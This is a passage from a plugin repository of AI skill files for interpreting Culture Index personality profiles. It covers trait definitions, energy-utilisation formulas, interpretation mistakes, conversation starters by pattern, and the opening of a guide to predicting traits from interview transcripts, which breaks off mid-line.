trailofbits/skills/plugins/culture-index\n```\n\n## Key Concepts\n\n### Trait Colors\n| Trait | Color | Measures |\n|-------|-------|----------|\n| A | Maroon | Autonomy, initiative |\n| B | Yellow | Social ability |\n| C | Blue | Pace/Patience |\n| D | Green | Conformity, detail |\n| L | Purple | Logic |\n| I | Cyan | Ingenuity |\n\n### Energy Utilization\n```\nUtilization = (Job EU / Survey EU) x 100\n\n70-130% = Healthy\n>130% = STRESS (burnout risk)\n<70% = FRUSTRATION (flight risk)\n```\n\n### Gas/Brake/Glue Framework\n| Role | Trait | Function |\n|------|-------|----------|\n| Gas | High A | Growth, risk-taking |\n| Brake | High D | Quality control |\n| Glue | High B | Relationships, morale |\n\n## Input Formats\n\n- **JSON** - Extracted profiles from culture-index tool (recommended)\n- **PDF** - Direct PDF analysis using Claude's vision\n\n## Workflows\n\n- `interpret-individual.md` - Single profile analysis\n- `analyze-team.md` - Team composition assessment\n- `detect-burnout.md` - Stress/frustration detection\n- `compare-profiles.md` - Multi-profile compatibility\n\n## Reference Documents\n\n- `primary-traits.md` - A, B, C, D trait details\n- `secondary-traits.md` - EU, L, I trait details\n- `patterns-archetypes.md` - 19 patterns and archetypes\n- `motivators.md` - Engagement strategies by trait\n- `team-composition.md` - Gas/brake/glue framework\n- `anti-patterns.md` - Common interpretation mistakes\n",
        "plugins/culture-index/skills/interpreting-culture-index/SKILL.md": "---\nname: interpreting-culture-index\ndescription: Use when interpreting Culture Index surveys, CI profiles, behavioral assessments, or personality data. Supports individual interpretation, team composition (gas/brake/glue), burnout detection, profile comparison, hiring profiles, manager coaching, interview transcript analysis for trait prediction, candidate debrief, onboarding planning, and conflict mediation. Handles PDF vision or JSON input.\n---\n\n<essential_principles>\n\n**Culture Index measures behavioral traits, not intelligence or skills. There is no \"good\" or \"bad\" profile.**\n\n<principle name=\"never-compare-absolutes\">\n**Never compare absolute trait values between people.**\n\nThe 0-10 scale is just a ruler. What matters is **distance from the red arrow** (population mean at 50th percentile). The arrow position varies between surveys based on EU.\n\n**Why the arrow moves:** Higher EU scores cause the arrow to plot further right; lower EU causes it to plot further left. This does not affect validitywe always measure distance from wherever the arrow lands.\n\n**Wrong**: \"Dan has higher autonomy than Jim because his A is 8 vs 5\"\n**Right**: \"Dan is +3 centiles from his arrow; Jim is +1 from his arrow\"\n\nAlways ask: Where is the arrow, and how far is the dot from it?\n</principle>\n\n<principle name=\"survey-vs-job\">\n**Survey = who you ARE. Job = who you're TRYING TO BE.**\n\n> **\"You can't send a duck to Eagle school.\"** Traits are hardwiredyou can only modify behaviors temporarily, at the cost of energy.\n\n- **Top graph (Survey Traits)**: Hardwired by age 12-16. Does not change. Writing with your dominant hand.\n- **Bottom graph (Job Behaviors)**: Adaptive behavior at work. Can change. Writing with your non-dominant hand.\n\nLarge differences between graphs indicate behavior modification, which drains energy and causes burnout if sustained 3-6+ months.\n</principle>\n\n<principle name=\"distance-interpretation\">\n**Distance from arrow determines trait strength.**\n\n| Distance | Label | Percentile | Interpretation |\n|----------|-------|------------|----------------|\n| On arrow | Normative | 50th | Flexible, situational |\n| 1 centile | Tendency | ~67th | Easier to modify |\n| 2 centiles | Pronounced | ~84th | Noticeable difference |\n| 4+ centiles | Extreme | ~98th | Hardwired, compulsive, predictable |\n\n**Key insight:** Every 2 centiles of distance = 1 standard deviation.\n\nExtreme traits drive extreme results but are harder to modify and less relatable to average people.\n</principle>\n\n<principle name=\"l-and-i-exception\">\n**L (Logic) and I (Ingenuity) use absolute values.**\n\nUnlike A, B, C, D, you CAN compare L and I scores directly between people:\n- Logic 8 means \"High Logic\" regardless of arrow position\n- Ingenuity 2 means \"Low Ingenuity\" for anyone\n\nOnly these two traits break the \"no absolute comparison\" rule.\n</principle>\n\n</essential_principles>\n\n<input_formats>\n\n**JSON (Use if available)**\n\nIf JSON data is already extracted, use it directly:\n```python\nimport json\nwith open(\"person_name.json\") as f:\n    profile = json.load(f)\n```\n\nJSON format:\n```json\n{\n  \"name\": \"Person Name\",\n  \"archetype\": \"Architect\",\n  \"survey\": {\n    \"eu\": 21,\n    \"arrow\": 2.3,\n    \"a\": [5, 2.7],\n    \"b\": [0, -2.3],\n    \"c\": [1, -1.3],\n    \"d\": [3, 0.7],\n    \"logic\": [5, null],\n    \"ingenuity\": [2, null]\n  },\n  \"job\": { \"...\" : \"same structure as survey\" },\n  \"analysis\": {\n    \"energy_utilization\": 148,\n    \"status\": \"stress\"\n  }\n}\n```\n\nNote: Trait values are `[absolute, relative_to_arrow]` tuples. Use the relative value for interpretation.\n\nCheck same directory as PDF for matching `.json` file, or ask user if they have extracted JSON.\n\n**PDF Input (MUST EXTRACT FIRST)**\n\n **NEVER use visual estimation for trait values.** Visual estimation has 20-30% error rate.\n\nWhen given a PDF:\n1. Check if JSON already exists (same directory as PDF, or ask user)\n2. If not, run extraction with verification:\n   ```bash\n   uv run {baseDir}/scripts/extract_pdf.py --verify /path/to/file.pdf [output.json]\n   ```\n3. Visually confirm the verification summary matches the PDF\n4. Use the extracted JSON for interpretation\n\n**If uv is not installed:** Stop and instruct user to install it (`brew install uv` or `pip install uv`). Do NOT fall back to vision.\n\n**PDF Vision (Reference Only)**\n\nVision may be used ONLY to verify extracted values look reasonable, NOT to extract trait scores.\n\n</input_formats>\n\n<intake>\n\n**Step 0: Do you have JSON or PDF?**\n\n1. **If JSON provided or found:** Use it directly (skip extraction)\n   - Check same directory as PDF for `.json` file with matching name\n   - Check if user provided JSON path\n2. **If only PDF:** Run extraction script with `--verify` flag\n   ```bash\n   uv run {baseDir}/scripts/extract_pdf.py --verify /path/to/file.pdf [output.json]\n   ```\n3. **If extraction fails:** Report error, do NOT fall back to vision\n\n**Step 1: What data do you have?**\n\n- **CI Survey JSON**  Proceed to Step 2\n- **CI Survey PDF**  Extract first (Step 0), then proceed to Step 2\n- **Interview transcript only**  Go to option 8 (predict traits from interview)\n- **No data yet**  \"Please provide Culture Index profile (PDF or JSON) or interview transcript\"\n\n**Step 2: What would you like to do?**\n\n**Profile Analysis:**\n1. **Interpret an individual profile** - Understand one person's traits, strengths, and challenges\n2. **Analyze team composition** - Assess gas/brake/glue balance, identify gaps\n3. **Detect burnout signals** - Compare Survey vs Job, flag stress/frustration\n4. **Compare multiple profiles** - Understand compatibility, collaboration dynamics\n5. **Get motivator recommendations** - Learn how to engage and retain someone\n\n**Hiring & Candidates:**\n6. **Define hiring profile** - Determine ideal CI traits for a role\n7. **Coach manager on direct report** - Adjust management style based on both profiles\n8. **Predict traits from interview** - Analyze interview transcript to estimate CI traits\n9. **Interview debrief** - Assess candidate fit based on predicted traits\n\n**Team Development:**\n10. **Plan onboarding** - Design first 90 days based on new hire and team profiles\n11. **Mediate conflict** - Understand friction between two people using their profiles\n\n**Provide the profile data (JSON or PDF) and select an option, or describe what you need.**\n\n</intake>\n\n<routing>\n\n| Response | Workflow |\n|----------|----------|\n| \"extract\", \"parse pdf\", \"convert pdf\", \"get json from pdf\" | `workflows/extract-from-pdf.md` |\n| 1, \"individual\", \"interpret\", \"understand\", \"analyze one\", \"single profile\" | `workflows/interpret-individual.md` |\n| 2, \"team\", \"composition\", \"gaps\", \"balance\", \"gas brake glue\" | `workflows/analyze-team.md` |\n| 3, \"burnout\", \"stress\", \"frustration\", \"survey vs job\", \"energy\", \"flight risk\" | `workflows/detect-burnout.md` |\n| 4, \"compare\", \"compatibility\", \"collaboration\", \"multiple\", \"two profiles\" | `workflows/compare-profiles.md` |\n| 5, \"motivate\", \"engage\", \"retain\", \"communicate\" | Read `references/motivators.md` directly |\n| 6, \"hire\", \"hiring profile\", \"role profile\", \"recruit\", \"what profile for\" | `workflows/define-hiring-profile.md` |\n| 7, \"manage\", \"coach\", \"1:1\", \"direct report\", \"manager\" | `workflows/coach-manager.md` |\n| 8, \"transcript\", \"interview\", \"predict traits\", \"guess\", \"estimate\", \"recording\" | `workflows/predict-from-interview.md` |\n| 9, \"debrief\", \"should we hire\", \"candidate fit\", \"proceed\", \"offer\" | `workflows/interview-debrief.md` |\n| 10, \"onboard\", \"new hire\", \"integrate\", \"starting\", \"first 90 days\" | `workflows/plan-onboarding.md` |\n| 11, \"conflict\", \"friction\", \"mediate\", \"not working together\", \"clash\" | `workflows/mediate-conflict.md` |\n| \"conversation starters\", \"how to talk to\", \"engage with\" | Read `references/conversation-starters.md` directly |\n\n**After reading the workflow, follow it exactly.**\n\n</routing>\n\n<verification_loop>\n\nAfter every interpretation, verify:\n\n1. **Did you use relative positions?** Never stated \"A is 8\" without context\n2. **Did you reference the arrow?** All trait interpretations relative to arrow\n3. **Did you compare Survey vs Job?** Identified any behavior modification\n4. **Did you avoid value judgments?** No traits called \"good\" or \"bad\"\n5. **Did you check EU?** Energy utilization calculated if both graphs present\n\nReport to user:\n- \"Interpretation complete\"\n- Key findings (2-3 bullet points)\n- Recommended actions\n\n</verification_loop>\n\n<reference_index>\n\n**Domain Knowledge** (in `references/`):\n\n**Primary Traits:**\n- `primary-traits.md` - A (Autonomy), B (Social), C (Pace), D (Conformity)\n\n**Secondary Traits:**\n- `secondary-traits.md` - EU (Energy Units), L (Logic), I (Ingenuity)\n\n**Patterns:**\n- `patterns-archetypes.md` - Behavioral patterns, trait combinations, archetypes\n\n**Application:**\n- `motivators.md` - How to motivate each trait type\n- `team-composition.md` - Gas, brake, glue framework\n- `anti-patterns.md` - Common interpretation mistakes\n- `conversation-starters.md` - How to engage each pattern and trait type\n- `interview-trait-signals.md` - Signals for predicting traits from interviews\n\n</reference_index>\n\n<workflows_index>\n\n**Workflows** (in `workflows/`):\n\n| File | Purpose |\n|------|---------|\n| `extract-from-pdf.md` | Extract profile data from Culture Index PDF to JSON format |\n| `interpret-individual.md` | Analyze single profile, identify archetype, summarize strengths/challenges |\n| `analyze-team.md` | Assess team balance (gas/brake/glue), identify gaps, recommend hires |\n| `detect-burnout.md` | Compare Survey vs Job, calculate EU utilization, flag risk signals |\n| `compare-profiles.md` | Compare multiple profiles, assess compatibility, collaboration dynamics |\n| `define-hiring-profile.md` | Define ideal CI traits for a role, identify acceptable patterns and red flags |\n| `coach-manager.md` | Help managers adjust their style for specific direct reports |\n| `predict-from-interview.md` | Analyze interview transcripts to predict CI traits before survey |\n| `interview-debrief.md` | Assess candidate fit using predicted traits from transcript analysis |\n| `plan-onboarding.md` | Design first 90 days based on new hire profile and team composition |\n| `mediate-conflict.md` | Understand and address friction between team members using their profiles |\n\n</workflows_index>\n\n<quick_reference>\n\n**Trait Colors:**\n| Trait | Color | Measures |\n|-------|-------|----------|\n| A | Maroon | Autonomy, initiative, self-confidence |\n| B | Yellow | Social ability, need for interaction |\n| C | Blue | Pace/Patience, urgency level |\n| D | Green | Conformity, attention to detail |\n| L | Purple | Logic, emotional processing |\n| I | Cyan | Ingenuity, inventiveness |\n\n**Energy Utilization Formula:**\n```\nUtilization = (Job EU / Survey EU)  100\n\n70-130% = Healthy\n>130% = STRESS (burnout risk)\n<70% = FRUSTRATION (flight risk)\n```\n\n**Gas/Brake/Glue:**\n| Role | Trait | Function |\n|------|-------|----------|\n| Gas | High A | Growth, risk-taking, driving results |\n| Brake | High D | Quality control, risk aversion, finishing |\n| Glue | High B | Relationships, morale, culture |\n\n**Score Precision:**\n| Value | Precision | Example |\n|-------|-----------|---------|\n| Traits (A,B,C,D,L,I) | Integer 0-10 | 0, 1, 2, ... 10 |\n| Arrow position | Tenths | 0.4, 2.2, 3.8 |\n| Energy Units (EU) | Integer | 11, 31, 45 |\n\n</quick_reference>\n\n<success_criteria>\n\nA well-interpreted Culture Index profile:\n- Uses relative positions (distance from arrow), never absolute values alone\n- Identifies the archetype/pattern correctly\n- Highlights 2-3 key strengths based on leading traits\n- Notes 2-3 challenges or development areas\n- Compares Survey vs Job if both are available\n- Provides actionable recommendations\n- Avoids value judgments (\"good\"/\"bad\")\n- Acknowledges Culture Index is one data point, not a complete picture\n\n</success_criteria>\n",
        "plugins/culture-index/skills/interpreting-culture-index/references/anti-patterns.md": "<overview>\n\nCommon mistakes when interpreting Culture Index profiles. Avoiding these errors is as important as understanding the methodology itself.\n\n</overview>\n\n<interpretation_mistakes>\n\n<mistake name=\"comparing-absolutes\">\n\n**Comparing absolute trait values between people**\n\n**Wrong:** \"Dan has higher autonomy than Jim because his A is 8 vs 5\"\n\n**Right:** \"Dan is +3 centiles from his arrow; Jim is +1 from his arrow\"\n\n**Why it's wrong:** The arrow position varies between surveys based on EU. An 8 with an arrow at 6 is only +2 from norm. A 5 with an arrow at 2 is +3 from norm.\n\n**Only exception:** L and I use absolute values and CAN be compared directly.\n\n</mistake>\n\n<mistake name=\"ignoring-arrow\">\n\n**Ignoring the red arrow position**\n\nThe arrow is the population mean (50th percentile). All interpretation must be relative to it.\n\n**Wrong:** \"This person has low B (score of 3)\"\n\n**Right:** \"This person's B is 2 centiles left of their arrow, indicating pronounced introversion\"\n\n</mistake>\n\n<mistake name=\"value-judgments\">\n\n**Treating traits as \"good\" or \"bad\"**\n\nCulture Index measures behavioral traits, not value or capability.\n\n**Wrong:**\n- \"High D is good because they're detail-oriented\"\n- \"Low B is bad because they're not social\"\n\n**Right:**\n- \"High D indicates strong attention to detail - fits roles requiring precision\"\n- \"Low B indicates preference for focused work - fits analytical roles\"\n\nThere is no universally \"good\" profile. Fit depends on role, team, and context.\n\n</mistake>\n\n<mistake name=\"stale-data\">\n\n**Using outdated data (18+ months old)**\n\nJob behaviors update as environment, leadership, or projects change. Stale data leads to wrong conclusions.\n\n**Best practice:** Resurvey job behaviors every 6 months, especially after major role or leadership changes.\n\n</mistake>\n\n<mistake name=\"single-trait-focus\">\n\n**Over-indexing on a single trait**\n\nThe pattern (relationship between traits) matters more than any individual dot.\n\n**Wrong:** \"They have High A, so they're a leader\"\n\n**Right:** \"High A combined with High D suggests they can build new systems. High A with Low D suggests they'll drive fast but may miss details.\"\n\n</mistake>\n\n<mistake name=\"ignoring-survey-vs-job\">\n\n**Not comparing Survey vs Job graphs**\n\nMissing burnout signals by only looking at one graph.\n\n**Always check:**\n- Did the arrow move? (Stress/Frustration signal)\n- Did any dots flip sides? (Polarizing shift - flight risk)\n- What's the EU utilization? (>130% stress, <70% frustration)\n\n</mistake>\n\n<mistake name=\"confusing-traits-behaviors\">\n\n**Confusing traits with behaviors**\n\nSurvey (top) = hardwired traits (who you ARE)\nJob (bottom) = adaptive behaviors (who you're TRYING TO BE)\n\nTraits don't change. Behaviors can be modified temporarily - but at an energy cost.\n\n**\"You can't send a duck to Eagle school.\"** - You can train behaviors, not traits.\n\n</mistake>\n\n</interpretation_mistakes>\n\n<application_mistakes>\n\n<mistake name=\"seeking-homogeneity\">\n\n**Hiring for homogeneous teams**\n\nHiring people who match the manager's profile creates blind spots.\n\n**Better approach:** Build diverse teams with complementary traits. Every team needs Gas (High A), Brake (High D), and Glue (High B) in appropriate proportions.\n\n</mistake>\n\n<mistake name=\"overloading-high-a\">\n\n**Overloading on High A's**\n\nHigh A's are \"the single hardest trait to employ.\" They work for \"me, Inc.\" first.\n\nToo many High A's = power struggles, lack of follow-through, no one to execute.\n\n**You are only RENTING High A's** - they need a mutually beneficial partnership.\n\n</mistake>\n\n<mistake name=\"neglecting-brake\">\n\n**Neglecting the Brake (High D)**\n\nEvery team needs quality control, risk management, and follow-through.\n\nWithout Brake: Erosion, mistakes, lawsuits, quality issues, things start but never finish.\n\n</mistake>\n\n<mistake name=\"assuming-fit-permanent\">\n\n**Assuming job fit is permanent**\n\nPeople's roles evolve. Business needs change. What fit yesterday may not fit tomorrow.\n\nRegular check-ins (resurvey every 6 months) catch misalignment before it becomes burnout or turnover.\n\n</mistake>\n\n<mistake name=\"using-ci-alone\">\n\n**Using Culture Index as the only data point**\n\nCulture Index is ONE tool among many. It measures behavioral traits, not:\n- Skills or competencies\n- Intelligence\n- Experience\n- Values\n- Motivation\n\n**Best practice:** Use CI alongside interviews, references, skills assessments, and performance data.\n\n</mistake>\n\n</application_mistakes>\n\n<communication_mistakes>\n\n<mistake name=\"sharing-raw-scores\">\n\n**Sharing raw scores without context**\n\nTelling someone \"Your A is 8\" without explaining relative position is meaningless and potentially harmful.\n\n**Always communicate:**\n- Position relative to arrow\n- What that means behaviorally\n- Why it's neither good nor bad\n- How it fits (or doesn't) with their role\n\n</mistake>\n\n<mistake name=\"labeling-people\">\n\n**Using CI to label or box people**\n\nCI shows tendencies, not destiny.\n\n**Wrong:** \"You're a Persuader, so you should only do sales\"\n\n**Right:** \"Your pattern shows strengths in influence and relationship building. How do you use those in your current role?\"\n\n</mistake>\n\n<mistake name=\"public-comparison\">\n\n**Comparing profiles publicly**\n\nNever compare individuals' profiles in group settings without their consent.\n\nDiscussing \"Person A is more detail-oriented than Person B\" creates hierarchy and judgment.\n\n</mistake>\n\n</communication_mistakes>\n\n<red_flags>\n\n**Signals that suggest deeper investigation:**\n\n| Signal | What to Check |\n|--------|---------------|\n| EU 0-10 (avoidant response) | Was survey completed properly? Trust issues? |\n| All dots on or near arrow | Chameleon pattern - less than 0.57% of population. Verify validity. |\n| Job behaviors completely opposite of Survey | Imminent flight risk. What's causing this extreme modification? |\n| EU utilization > 150% | Severe stress. Immediate conversation needed. |\n| EU utilization < 50% | Severe disengagement. May have already mentally quit. |\n| D raised significantly in Job behaviors | Most common unsustainable stress pattern. Why do they feel they need to be so much more perfectionist? |\n\n</red_flags>\n\n<checklist>\n\n**Before finalizing any interpretation:**\n\n- [ ] Did I use relative positions (distance from arrow)?\n- [ ] Did I avoid calling any trait \"good\" or \"bad\"?\n- [ ] Did I compare Survey vs Job if both available?\n- [ ] Did I calculate EU utilization?\n- [ ] Did I consider the full pattern, not just leading traits?\n- [ ] Is my data current (less than 18 months old)?\n- [ ] Did I note that CI is one data point among many?\n\n</checklist>\n\n<rationalization_table>\n\n**Common excuses that indicate you're about to make a CI interpretation mistake:**\n\n| Excuse | Reality |\n|--------|---------|\n| \"Their A is higher so they're more autonomous\" | Compare distance from arrow, not absolute values |\n| \"This is a bad profile for leadership\" | No bad profiles - fit depends on role and context |\n| \"They need to change their C trait\" | Survey traits are hardwired - change the environment instead |\n| \"Low B means they're not a team player\" | Low B means they prefer focused work - they can still collaborate |\n| \"High D is always good for quality\" | High D without other traits can mean paralysis and rigidity |\n| \"They should be more like their manager\" | Different profiles bring complementary strengths |\n| \"This pattern can't do that job\" | Patterns indicate tendencies, not hard limits |\n| \"Their EU is fine, the job is the problem\" | EU tells you about energy, not about job design |\n| \"I remember their profile from last year\" | Resurvey Job behaviors every 6 months - they change |\n| \"The arrow doesn't matter, just look at the dots\" | The arrow IS the reference point - dots mean nothing without it |\n| \"L and I work the same as A, B, C, D\" | L and I use absolute values, primary traits are relative |\n| \"Survey and Job will be the same\" | Survey = hardwired, Job = adaptive. They often differ. |\n| \"High A means they're selfish\" | High A means they're self-directed - not the same thing |\n| \"We need all High A's on this high-growth team\" | You're renting High A's, and they'll clash with each other |\n| \"This hire looks good, skip the CI\" | CI is one data point - use it WITH other assessments, not instead of |\n\n</rationalization_table>\n",
        "plugins/culture-index/skills/interpreting-culture-index/references/conversation-starters.md": "<overview>\n\nConversation starters and engagement strategies based on Culture Index traits. Use these to build rapport, deliver feedback effectively, and engage team members based on their profile.\n\n</overview>\n\n<by_pattern>\n\n<architect label=\"Architect/Visionary (High A, Low C, Low D)\">\n\n**What engages them:**\n- Strategic discussions, big picture thinking\n- Future vision and possibilities\n- ROI and business impact\n- Being asked for their opinion\n\n**Good conversation starters:**\n- \"What do you think is the biggest opportunity we're missing?\"\n- \"If you could redesign this from scratch, what would you change?\"\n- \"What's your take on [strategic topic]?\"\n- \"Where do you see this going in 2-3 years?\"\n\n**How to deliver feedback:**\n- Focus on outcomes and impact, not process\n- Be direct and confident - don't hedge\n- Frame as investment in their success\n- Bullet points, not paragraphs\n\n**Topics to avoid:**\n- Excessive detail about implementation\n- Step-by-step instructions\n- Past failures (they've moved on)\n- Lengthy consensus-building\n\n</architect>\n\n<rainmaker label=\"Rainmaker/Persuader (High A, High B, Low C)\">\n\n**What engages them:**\n- Relationship building\n- Competitive challenges\n- Public recognition opportunities\n- Stories and narratives\n\n**Good conversation starters:**\n- \"How did you land that account?\"\n- \"What's your read on [person/client]?\"\n- \"Tell me about your biggest win this quarter\"\n- \"Who should I talk to about [topic]?\"\n\n**How to deliver feedback:**\n- Balance directness with relationship\n- Public praise, private criticism\n- Frame around their reputation and influence\n- Keep it brief - they'll want to talk\n\n**Topics to avoid:**\n- Detailed process requirements\n- Solitary work expectations\n- Administrative tasks\n- Slow-moving, bureaucratic topics\n\n</rainmaker>\n\n<scholar label=\"Scholar/Specialist (Low B, High C, High D)\">\n\n**What engages them:**\n- Deep expertise discussions\n- Complex technical problems\n- Quality and precision topics\n- Learning opportunities\n\n**Good conversation starters:**\n- \"I'd like your expert opinion on [technical topic]\"\n- \"Can you walk me through how this works?\"\n- \"What do you think is the right way to approach this?\"\n- \"I'm trying to understand [complex topic] - can you help?\"\n\n**How to deliver feedback:**\n- Be specific and fact-based\n- Reference documentation or standards\n- Give them time to process\n- Private, not public\n- Written follow-up appreciated\n\n**Topics to avoid:**\n- Forced small talk\n- Vague, unstructured discussions\n- Expecting quick verbal responses\n- Public attention or praise\n\n</scholar>\n\n<technical_expert label=\"Technical Expert (Low A, Low B, Low C, High D)\">\n\n**What engages them:**\n- Efficient, focused discussions\n- Clear problems with clear solutions\n- Quality and accuracy\n- Getting things done\n\n**Good conversation starters:**\n- \"I need your help solving [specific problem]\"\n- \"What's the correct way to do this?\"\n- \"Can you review this for accuracy?\"\n- \"Here's the situation - what's your take?\"\n\n**How to deliver feedback:**\n- Very direct and specific\n- Focus on the work, not the person\n- Provide clear standards to meet\n- Brief and efficient\n\n**Topics to avoid:**\n- Extended social conversation\n- Vague or open-ended questions\n- Consensus-building meetings\n- Public recognition (uncomfortable)\n\n</technical_expert>\n\n<craftsman label=\"Craftsman (Low A, Low B, High C, High D)\">\n\n**What engages them:**\n- Mastery and expertise\n- Consistent, reliable processes\n- Quality discussions\n- Predictable environments\n\n**Good conversation starters:**\n- \"You're the expert on this - what should I know?\"\n- \"What's the best practice for [specific task]?\"\n- \"I want to make sure we do this right\"\n- \"Can you help me understand the proper process?\"\n\n**How to deliver feedback:**\n- Frame as process improvement\n- Reference standards and best practices\n- One topic at a time\n- Allow time to process and respond\n\n**Topics to avoid:**\n- Rapid-fire questions\n- Unstructured brainstorming\n- Public speaking or presentations\n- Frequent change of plans\n\n</craftsman>\n\n<accommodator label=\"Accommodator (Low A, High B, High C)\">\n\n**What engages them:**\n- Team and relationship discussions\n- Helping others succeed\n- Collaborative problem-solving\n- Stable, supportive environments\n\n**Good conversation starters:**\n- \"How's the team doing?\"\n- \"Who needs support right now?\"\n- \"What would make this easier for everyone?\"\n- \"How can I help you help the team?\"\n\n**How to deliver feedback:**\n- Gentle but clear\n- Acknowledge their contributions\n- Frame around team impact\n- Give time to adjust\n\n**Topics to avoid:**\n- Aggressive confrontation\n- Demanding immediate decisions\n- Forcing them to take sides\n- Public criticism\n\n</accommodator>\n\n<philosopher label=\"Philosopher (High A, Low B, High C)\">\n\n**What engages them:**\n- Deep analytical discussions\n- Strategic thinking\n- Independent problem-solving\n- Time to think and process\n\n**Good conversation starters:**\n- \"What's your analysis of [complex situation]?\"\n- \"I'd value your perspective on this\"\n- \"If you had to choose a direction, what would it be?\"\n- \"What patterns are you seeing?\"\n\n**How to deliver feedback:**\n- Logical, fact-based\n- Allow processing time\n- Written communication works well\n- Respect their independence\n\n**Topics to avoid:**\n- Forced team activities\n- Rapid decision demands\n- Excessive small talk\n- Public group discussions\n\n</philosopher>\n\n</by_pattern>\n\n<by_trait>\n\n<high_a label=\"Engaging High A (Autonomous/Assertive)\">\n\n**Do:**\n- Ask for their opinion before sharing yours\n- Give outcomes, not instructions\n- Respect their time (be efficient)\n- Challenge them intellectually\n- Acknowledge their expertise\n\n**Don't:**\n- Micromanage or over-explain\n- Expect consensus-building\n- Take too long to get to the point\n- Show hesitation or uncertainty\n- Dismiss their ideas without discussion\n\n**Feedback style:**\n- Direct, confident, brief\n- Focus on ROI and impact\n- Their investment in success\n\n</high_a>\n\n<low_a label=\"Engaging Low A (Supportive/Collaborative)\">\n\n**Do:**\n- Include them in discussions\n- Acknowledge their contributions\n- Provide clear direction\n- Give specific praise\n- Allow time for input\n\n**Don't:**\n- Put them on the spot for decisions\n- Expect aggressive initiative\n- Skip collaboration for speed\n- Interpret silence as agreement\n- Assume they'll speak up with concerns\n\n**Feedback style:**\n- Specific, supportive\n- Private, not public\n- Clear expectations\n\n</low_a>\n\n<high_b label=\"Engaging High B (Social/Relational)\">\n\n**Do:**\n- Start with personal connection\n- Allow time for rapport\n- Include in group activities\n- Praise publicly\n- Ask about relationships and team\n\n**Don't:**\n- Skip small talk\n- Isolate with solo work\n- Give criticism publicly\n- Expect brief, task-only interaction\n- Forget they process verbally\n\n**Feedback style:**\n- Start with relationship\n- Verbal praise matters\n- Private for criticism\n\n</high_b>\n\n<low_b label=\"Engaging Low B (Reserved/Task-Focused)\">\n\n**Do:**\n- Get to the point\n- Respect their focus time\n- Use written communication\n- Give private recognition\n- Allow solo work time\n\n**Don't:**\n- Force extended social interaction\n- Expect verbal processing\n- Praise publicly (uncomfortable)\n- Require constant meetings\n- Mistake quiet for disengagement\n\n**Feedback style:**\n- Efficient, task-focused\n- Written is appreciated\n- Private, not public\n\n</low_b>\n\n<high_c label=\"Engaging High C (Patient/Steady)\">\n\n**Do:**\n- Send agendas in advance\n- One topic at a time\n- Give advance notice of changes\n- Respect their routines\n- Allow processing time\n\n**Don't:**\n- Surprise them with changes\n- Rush decisions\n- Interrupt their focus time\n- Multi-topic meetings\n- Create unnecessary urgency\n\n**Feedback style:**\n- Scheduled, predictable\n- Advance notice helpful\n- One issue at a time\n\n</high_c>\n\n<low_c label=\"Engaging Low C (Urgent/Fast-Paced)\">\n\n**Do:**\n- Put deadlines in subject lines\n- Keep them busy with variety\n- Accept their urgency\n- Use their energy productively\n- Be ready for interruptions\n\n**Don't:**\n- Expect patient waiting\n- Give slow, drawn-out responses\n- Bore them with routine\n- Slow-walk decisions\n- Be surprised by multitasking\n\n**Feedback style:**\n- Quick and direct\n- Deadlines motivate\n- Don't delay\n\n</low_c>\n\n<high_d label=\"Engaging High D (Detail/Precise)\">\n\n**Do:**\n- Be accurate and specific\n- Reference standards and process\n- Provide documentation\n- Acknowledge their precision\n- Build trust carefully\n\n**Don't:**\n- Make it personal\n- Skip details that matter\n- Break commitments\n- Expect flexibility on quality\n- Give vague instructions\n\n**Feedback style:**\n- Process improvement framing\n- Specific, documented\n- Don't break trust\n\n</high_d>\n\n<low_d label=\"Engaging Low D (Flexible/Big-Picture)\">\n\n**Do:**\n- Give creative problems\n- Provide options\n- Focus on outcomes\n- Accept 80% solutions\n- Allow flexibility\n\n**Don't:**\n- Over-structure\n- Expect precise documentation\n- Hold grudges for missed details\n- Box them in with rules\n- Require perfection\n\n**Feedback style:**\n- Focus on what matters\n- Pick your battles\n- Options over mandates\n\n</low_d>\n\n</by_trait>\n\n<quick_reference>\n\n| Pattern | Open With | Avoid | Feedback Style |\n|---------|-----------|-------|----------------|\n| Architect | \"What's your vision...\" | Detail-heavy | Direct, ROI-focused |\n| Rainmaker | \"How did you...\" | Solitary topics | Public praise, private critique |\n| Scholar | \"Walk me through...\" | Small talk | Written, specific |\n| Technical Expert | \"I need help with...\" | Open-ended | Direct, efficient |\n| Craftsman | \"What's the right way...\" | Rapid-fire | Process improvement |\n| Accommodator | \"How's the team...\" | Confrontation | Gentle, supportive |\n| Philosopher | \"What's your analysis...\" | Forced social | Logical, written |\n\n</quick_reference>\n",
        "plugins/culture-index/skills/interpreting-culture-index/references/interview-trait-signals.md": "<overview>\n\nThis reference helps predict Culture Index traits from interview transcripts. Candidates don't take CI during interviews - these signals help estimate traits before the actual survey is administered after an offer is signed.\n\n**Important caveats:**\n- Predictions are estimates, not definitive assessments\n- Interview context affects behavior (stress, performance mode)\n- Always note confidence level for each trait\n- Actual CI survey will confirm or correct predictions\n\n</overview>\n\n<trait_signals>\n\n<autonomy_a label=\"Autonomy (A) Signals\">\n\n**High A indicators (right of arrow):**\n- Uses \"I\" frequently: \"I decided...\", \"I built...\", \"I led...\"\n- Takes personal credit for outcomes\n- Describes situations where they acted independently\n- Pushes back on interviewer questions or reframes them\n- Strategic framing - connects work to business outcomes\n- Confident tone, assertive statements\n- Mentions enjoying autonomy, disliking micromanagement\n- Describes taking initiative without being asked\n\n**Low A indicators (left of arrow):**\n- Uses \"we\" predominantly: \"We decided...\", \"Our team...\"\n- Deflects credit to the team\n- Asks clarifying questions before answering\n- Seeks validation: \"Does that make sense?\"\n- Describes collaborative decision-making\n- Mentions appreciating clear direction\n- More tentative language: \"I think...\", \"Maybe...\"\n- Waits for prompts rather than driving conversation\n\n**Confidence modifiers:**\n- HIGH confidence: Multiple consistent signals across different questions\n- MEDIUM confidence: Mixed signals or few data points\n- LOW confidence: Signals only in specific contexts (may be performance mode)\n\n</autonomy_a>\n\n<social_b label=\"Social Ability (B) Signals\">\n\n**High B indicators (right of arrow):**\n- Builds rapport quickly, asks about interviewer\n- Animated, expressive communication style\n- Tells stories with people as central characters\n- Discusses team dynamics, relationships\n- Uses humor, creates connection\n- Mentions enjoying collaboration, team activities\n- Verbose responses, talks through thinking\n- Mirrors interviewer's energy and style\n\n**Low B indicators (left of arrow):**\n- Brief, direct answers without elaboration\n- Skips small talk, gets to the point\n- Task-focused: describes what was done, not who was involved\n- Reserved or flat affect\n- Minimal questions about the team/culture\n- Doesn't engage with personal questions\n- Processes internally before responding\n- Technical precision over narrative style\n\n**Confidence modifiers:**\n- HIGH confidence: Behavior consistent 